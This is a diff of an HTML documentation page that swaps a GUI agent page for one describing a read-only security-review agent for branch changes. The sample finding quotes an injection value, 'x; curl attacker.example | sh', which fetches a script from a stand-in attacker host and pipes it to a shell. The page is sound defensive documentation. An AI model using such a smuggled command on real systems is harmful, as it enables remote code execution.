@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" data-base="/docs/" data-page-lang="en" data-build="1786544365" data-alt-lang-url="/docs/capabilities/workflows/gui-agent.zh.html">
+<html lang="en" data-base="/docs/" data-page-lang="en" data-build="1786544365" data-alt-lang-url="/docs/capabilities/security-review.zh.html">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>GUI Agent · OpenProgram Docs</title>
+<title>Security review · OpenProgram Docs</title>
 <script>
 (function(){try{var t=localStorage.getItem('op-docs-theme');
 if(!t)t=matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
@@ -66,7 +66,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <div class="nav-sec">
 <div class="nav-sec-title">Agentic Workflows</div>
 <a class="navlink" href="/docs/capabilities/workflows/README.html" data-title-zh="Agentic Workflows" data-href-en="/docs/capabilities/workflows/README.html" data-href-zh="/docs/capabilities/workflows/README.zh.html">Agentic workflows</a>
-<a class="navlink active" href="/docs/capabilities/workflows/gui-agent.html" data-title-zh="GUI Agent" data-href-en="/docs/capabilities/workflows/gui-agent.html" data-href-zh="/docs/capabilities/workflows/gui-agent.zh.html">GUI Agent</a>
+<a class="navlink" href="/docs/capabilities/workflows/gui-agent.html" data-title-zh="GUI Agent" data-href-en="/docs/capabilities/workflows/gui-agent.html" data-href-zh="/docs/capabilities/workflows/gui-agent.zh.html">GUI Agent</a>
 <a class="navlink" href="/docs/capabilities/workflows/research-agent.html" data-title-zh="Research Agent" data-href-en="/docs/capabilities/workflows/research-agent.html" data-href-zh="/docs/capabilities/workflows/research-agent.zh.html">Research Agent</a>
 <a class="navlink" href="/docs/capabilities/workflows/wiki-agent.html" data-title-zh="Wiki Agent" data-href-en="/docs/capabilities/workflows/wiki-agent.html" data-href-zh="/docs/capabilities/workflows/wiki-agent.zh.html">Wiki Agent</a>
 </div>
@@ -84,7 +84,7 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 </div>
 <div class="nav-sec">
 <div class="nav-sec-title" data-title-zh="安全审查">Security review</div>
-<a class="navlink" href="/docs/capabilities/security-review.html" data-title-zh="安全审查" data-href-en="/docs/capabilities/security-review.html" data-href-zh="/docs/capabilities/security-review.zh.html">Security review</a>
+<a class="navlink active" href="/docs/capabilities/security-review.html" data-title-zh="安全审查" data-href-en="/docs/capabilities/security-review.html" data-href-zh="/docs/capabilities/security-review.zh.html">Security review</a>
 </div>
 <div class="nav-sec">
 <div class="nav-sec-title" data-title-zh="扩展">Extending</div>
@@ -101,59 +101,122 @@ document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
 <a class="navlink" href="/docs/capabilities/commit-push-pr.html" data-title-zh="Commit, push, PR（提交、推送、开 PR）" data-href-en="/docs/capabilities/commit-push-pr.html" data-href-zh="/docs/capabilities/commit-push-pr.zh.html">Commit, push, PR</a>
 </div></div>
   </nav>
-  <main class="content"><button class="fs-toggle" aria-label="Fullscreen" title="Fullscreen (Esc to exit)"><svg class="ic-expand" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6.2 2H2v4.2M9.8 2H14v4.2M6.2 14H2V9.8M9.8 14H14V9.8"/></svg><svg class="ic-collapse" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M2 6.2h4.2V2M14 6.2H9.8V2M2 9.8h4.2V14M14 9.8H9.8V14"/></svg></button><article><nav class="breadcrumb"><span class="bc-seg" data-title-zh="能力">Capabilities</span> <span class='bc-sep'>›</span> <span class="bc-seg">Agentic Workflows</span> <span class='bc-sep'>›</span> <span class="bc-seg bc-current">GUI Agent</span></nav><h1 id="gui-agent">GUI Agent<a class="header-anchor" href="#gui-agent">#</a></h1>
-<p>Give it a natural-language task and it operates the desktop autonomously: taking screenshots, detecting UI components, clicking, typing, and verifying results, looping until the task completes or the step limit is reached. It works on the local desktop and can also drive remote virtual machines through a VM interface. The perception layer combines YOLO component detection (GPA-GUI-Detector), OCR (Apple Vision on macOS, EasyOCR on Linux / Windows), and template matching; the action layer covers mouse, keyboard, and clipboard. On the OSWorld benchmark it scores 79.8% on the Multi-Apps split (<a href="https://github.com/Fzkuji/GUI-Agent-Harness/blob/main/benchmarks/osworld/multi_apps.md">results</a>).</p>
-<h2 id="install">Install<a class="header-anchor" href="#install">#</a></h2>
-<pre><code class="language-bash">openprogram<span class="w"> </span>programs<span class="w"> </span>install<span class="w"> </span>gui
+  <main class="content"><button class="fs-toggle" aria-label="Fullscreen" title="Fullscreen (Esc to exit)"><svg class="ic-expand" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M6.2 2H2v4.2M9.8 2H14v4.2M6.2 14H2V9.8M9.8 14H14V9.8"/></svg><svg class="ic-collapse" width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M2 6.2h4.2V2M14 6.2H9.8V2M2 9.8h4.2V14M14 9.8H9.8V14"/></svg></button><article><nav class="breadcrumb"><span class="bc-seg" data-title-zh="能力">Capabilities</span> <span class='bc-sep'>›</span> <span class="bc-seg" data-title-zh="安全审查">Security review</span> <span class='bc-sep'>›</span> <span class="bc-seg bc-current" data-title-zh="安全审查">Security review</span></nav><h1 id="security-review">Security review<a class="header-anchor" href="#security-review">#</a></h1>
+<p>A security review audits what your branch changed, not what your repository contains. It collects everything since the branch's baseline — commits, staged changes, unstaged edits, and files you have not added yet — and hands it to a read-only agent that looks for vulnerabilities the change introduced. A weakness that already existed and that the branch merely moved past is left alone, so what comes back is a list you can act on before you open a pull request.</p>
+<p>Run it from the Functions panel as <code>run_security_review</code>, or call it from Python:</p>
+<pre><code class="language-python"><span class="kn">from</span><span class="w"> </span><span class="nn">openprogram.functions.agentics.security_review</span><span class="w"> </span><span class="kn">import</span> <span class="n">run_security_review</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">run_security_review</span><span class="p">()</span>
 </code></pre>
-<p>This is the heaviest of the three first-party workflows: dependencies include <code>torch</code> / <code>torchvision</code>, <code>opencv-python</code>, <code>ultralytics</code>, <code>easyocr</code>, <code>pynput</code>, and more. On Linux without a GPU it automatically picks the CPU torch wheel (about 300 MB) instead of the roughly 3 GB CUDA build.</p>
-<p>Beyond the pip dependencies you also need model files — the YOLO detector weights (downloaded via <code>huggingface-hub</code>) and the OCR models are not on PyPI. After installing, run the harness's bundled installer to fetch them:</p>
-<pre><code class="language-bash">openprogram/functions/agentics/GUI-Agent-Harness/scripts/install.sh<span class="w"> </span>--no-host
-<span class="c1"># Windows: ...\scripts\install.ps1 -NoHost</span>
+<h2 id="choosing-the-baseline">Choosing the baseline<a class="header-anchor" href="#choosing-the-baseline">#</a></h2>
+<p>With no <code>base</code> argument, the baseline is picked the way a reviewer would pick it:</p>
+<ol>
+<li>the merge base with the branch's configured upstream — what the branch will actually be compared against when it is proposed;</li>
+<li>failing that, the merge base with a default branch (<code>origin/HEAD</code>, <code>origin/main</code>, <code>origin/master</code>, then their local names) — the same answer for a branch that has not been pushed yet.</li>
+</ol>
+<p>A repository with neither raises <code>NoBaselineError</code> naming what was missing. It does not fall back to <code>HEAD~1</code> or the root commit: a guessed range reviews the wrong changes and says nothing about having done so. Pass the baseline yourself when you want a specific range:</p>
+<pre><code class="language-python"><span class="n">run_security_review</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="s2">&quot;v2.1.0&quot;</span><span class="p">)</span>
 </code></pre>
-<h2 id="usage">Usage<a class="header-anchor" href="#usage">#</a></h2>
-<p>The entry function is <strong><code>gui_agent</code></strong>, registered as a tool (<code>as_tool=True</code>, toolset <code>harness</code>). In chat, just describe a desktop task to trigger it, e.g. &quot;Open Firefox and go to google.com&quot;.</p>
-<p>Run it directly from the command line:</p>
-<pre><code class="language-bash">openprogram<span class="w"> </span>programs<span class="w"> </span>run<span class="w"> </span>gui_agent<span class="w"> </span>-a<span class="w"> </span><span class="nv">task</span><span class="o">=</span><span class="s2">&quot;Open Firefox and go to google.com&quot;</span>
-</code></pre>
-<p>Parameters (function signature <code>gui_agent(task, max_steps=15, app_name=&quot;desktop&quot;, ...)</code>):</p>
+<h2 id="what-is-collected">What is collected<a class="header-anchor" href="#what-is-collected">#</a></h2>
+<p>One diff against the working tree, so committed, staged and unstaged changes all land in the same review — you get the same answer whether or not you committed first. Untracked files are diffed in as well, because a new file is where a hardcoded secret is most likely to be and a plain diff cannot see it. Ignored files stay out, so build output and vendored trees never enter the review, and the index you are composing is never touched.</p>
+<p>A branch with nothing changed returns no findings immediately, without spending an agent turn. A diff too large to review in one pass is truncated with the cut stated in the prompt, so the reviewer reports on what it actually saw.</p>
+<h2 id="what-is-reviewed">What is reviewed<a class="header-anchor" href="#what-is-reviewed">#</a></h2>
+<p>The reviewer works through these classes against the changed code:</p>
 <table>
 <thead>
 <tr>
-<th>Parameter</th>
-<th>Description</th>
+<th>Class</th>
+<th>Examples</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>task</code></td>
-<td>What to do, in natural language</td>
+<td>Injection</td>
+<td>SQL built by concatenation, <code>shell=True</code> with interpolated arguments, path traversal, SSRF, template and header injection</td>
 </tr>
 <tr>
-<td><code>max_steps</code></td>
-<td>Maximum number of actions before giving up; default 15, choices 5 / 10 / 15 / 30</td>
+<td>Authentication and authorization</td>
+<td>A new route without its siblings' check, an object fetched by request id without an ownership check, a role or tenant check weakened or moved after the effect it guards</td>
 </tr>
 <tr>
-<td><code>app_name</code></td>
-<td>Application name used for component memory, e.g. <code>firefox</code>, <code>libreoffice_calc</code>; default <code>desktop</code></td>
+<td>Secrets and sensitive data</td>
+<td>Keys and tokens hardcoded or committed to fixtures, credentials written to logs or exception text, secrets passed as command-line arguments</td>
+</tr>
+<tr>
+<td>Unsafe deserialization and dynamic execution</td>
+<td><code>pickle</code>, <code>yaml.load</code> without <code>SafeLoader</code>, <code>eval</code> and <code>exec</code>, dispatch on caller-supplied attribute names, XML with external entities</td>
+</tr>
+<tr>
+<td>Concurrency and TOCTOU</td>
+<td>A check separated from the action it guards, shared state touched without a lock, temp files created by name</td>
+</tr>
+<tr>
+<td>Resource exhaustion</td>
+<td>Unbounded reads and archive extraction, caller-controlled allocation sizes, catastrophic regex backtracking, missing outbound timeouts</td>
+</tr>
+<tr>
+<td>Dependencies and supply chain</td>
+<td>A new dependency unpinned or from a non-canonical index, a build step piping a remote script to a shell, verification disabled</td>
+</tr>
+<tr>
+<td>Error handling and disclosure</td>
+<td>Stack traces and internal paths returned to callers, swallowed exceptions that turn a failed check into a success</td>
 </tr>
 </tbody>
 </table>
-<p>Each step runs observe (screenshot + component detection + state recognition) → verify the previous step's result → plan the next action → execute → build feedback for the next round. Structured feedback is passed between steps, so progress does not depend on the LLM's context memory. Previously learned UI transitions are reused as shortcuts (component memory).</p>
-<h2 id="dependency-notes">Dependency notes<a class="header-anchor" href="#dependency-notes">#</a></h2>
-<ul>
-<li>PyTorch + OpenCV are large; installation takes minutes. No transformers / accelerate needed.</li>
-<li>The model weights are a separate download step (see above); without them the function registers but cannot perceive the screen.</li>
-<li>Platforms: macOS / Windows / Linux; the OCR backend is selected automatically per platform.</li>
-<li>The runtime needs a working directory configured before running (screenshots and run records are written there).</li>
-</ul>
-<p>Source and README: <code>openprogram/functions/agentics/GUI-Agent-Harness/</code>, upstream repository <a href="https://github.com/Fzkuji/GUI-Agent-Harness">Fzkuji/GUI-Agent-Harness</a>.</p>
-<div class="page-updated"><span data-i18n="updated">Last updated</span> · 2026-08-12</div><div class="prevnext"><a class="pn-link pn-prev" href="/docs/capabilities/workflows/README.html"><span class="pn-dir" data-i18n="prev">Previous</span><span class="pn-title">Agentic workflows</span></a><a class="pn-link pn-next" href="/docs/capabilities/workflows/research-agent.html"><span class="pn-dir" data-i18n="next">Next</span><span class="pn-title">Research Agent</span></a></div></article></main>
+<p>The diff is a window rather than the whole program, so the reviewer reads the surrounding source before deciding: where the input comes from, whether it is validated upstream, who calls the function, what the sink does. That is what separates a dangerous-looking pattern that is fine in context from a plain-looking line that is a bug once you see its caller.</p>
+<h2 id="read-only-by-construction">Read-only by construction<a class="header-anchor" href="#read-only-by-construction">#</a></h2>
+<p>The review agent gets <code>read</code>, <code>grep</code>, <code>glob</code>, <code>list</code> and <code>bash</code> — no <code>write</code>, <code>edit</code>, <code>apply_patch</code>, or agent spawning. A reviewer that can write is a reviewer that can &quot;fix&quot; what it thinks it found, and a security opinion is worth nothing if producing it changed the thing under review. Fixes come back as recommendations for you to apply.</p>
+<h2 id="what-it-returns">What it returns<a class="header-anchor" href="#what-it-returns">#</a></h2>
+<pre><code class="language-python"><span class="p">{</span><span class="s2">&quot;base&quot;</span><span class="p">:</span> <span class="s2">&quot;a1b2c3d…&quot;</span><span class="p">,</span> <span class="s2">&quot;files_reviewed&quot;</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="s2">&quot;findings&quot;</span><span class="p">:</span> <span class="p">[</span>
+    <span class="p">{</span><span class="s2">&quot;severity&quot;</span><span class="p">:</span> <span class="s2">&quot;critical&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;file&quot;</span><span class="p">:</span> <span class="s2">&quot;api/users.py&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;line&quot;</span><span class="p">:</span> <span class="mi">42</span><span class="p">,</span>
+     <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;Command injection through the export filename&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;scenario&quot;</span><span class="p">:</span> <span class="s2">&quot;An authenticated caller sets filename to `x; curl attacker.example | sh`; the value reaches subprocess with shell=True and runs as the service account.&quot;</span><span class="p">,</span>
+     <span class="s2">&quot;recommendation&quot;</span><span class="p">:</span> <span class="s2">&quot;Pass the argument list to subprocess without shell=True, and reject filenames outside [A-Za-z0-9._-].&quot;</span><span class="p">},</span>
+<span class="p">]}</span>
+</code></pre>
+<p>Findings come ordered with <code>critical</code> first. Severity is about consequence:</p>
+<table>
+<thead>
+<tr>
+<th>Severity</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>critical</code></td>
+<td>Remote code execution, authentication bypass, or mass data exposure, reachable unauthenticated</td>
+</tr>
+<tr>
+<td><code>high</code></td>
+<td>Privilege escalation, exposure of another user's data, or a leaked live credential</td>
+</tr>
+<tr>
+<td><code>medium</code></td>
+<td>Exploitable only with valid credentials, an unlikely configuration, or another bug chained in</td>
+</tr>
+<tr>
+<td><code>low</code></td>
+<td>Hardening: defence in depth, a weak default, information mildly useful to an attacker</td>
+</tr>
+</tbody>
+</table>
+<p>Every finding carries a concrete triggering scenario — who sends what, through which entry point, and what they get. A finding whose scenario cannot be written is dropped rather than reported vaguely.</p>
+<p>An empty <code>findings</code> list is a normal result and means the change looks clean. The reviewer is told plainly not to promote an observation to a vulnerability in order to have something to report, because a review that invents findings costs you more than one that finds nothing.</p>
+<h2 id="compared-to-a-code-review">Compared to a code review<a class="header-anchor" href="#compared-to-a-code-review">#</a></h2>
+<p>This is a security review, not a code review: style, missing tests, and design opinions are out of scope, and so is any weakness the branch did not touch. Use it as the last pass before proposing a change, alongside whatever review your team already runs.</p>
+<div class="page-updated"><span data-i18n="updated">Last updated</span> · 2026-08-12</div><div class="prevnext"><a class="pn-link pn-prev" href="/docs/capabilities/docs-question.html"><span class="pn-dir" data-i18n="prev">Previous</span><span class="pn-title">Asking about OpenProgram itself</span></a><a class="pn-link pn-next" href="/docs/capabilities/installing-harnesses.html"><span class="pn-dir" data-i18n="next">Next</span><span class="pn-title">Harnesses</span></a></div></article></main>
   <aside class="toc"><div class="toc-title" data-i18n="on_this_page">On this page</div>
 <div class="toc-list">
-<a class="" href="#install">Install</a>
-<a class="" href="#usage">Usage</a>
-<a class="" href="#dependency-notes">Dependency notes</a>
+<a class="" href="#choosing-the-baseline">Choosing the baseline</a>
+<a class="" href="#what-is-collected">What is collected</a>
+<a class="" href="#what-is-reviewed">What is reviewed</a>
+<a class="" href="#read-only-by-construction">Read-only by construction</a>
+<a class="" href="#what-it-returns">What it returns</a>
+<a class="" href="#compared-to-a-code-review">Compared to a code review</a>
 </div></aside>
 </div>
 
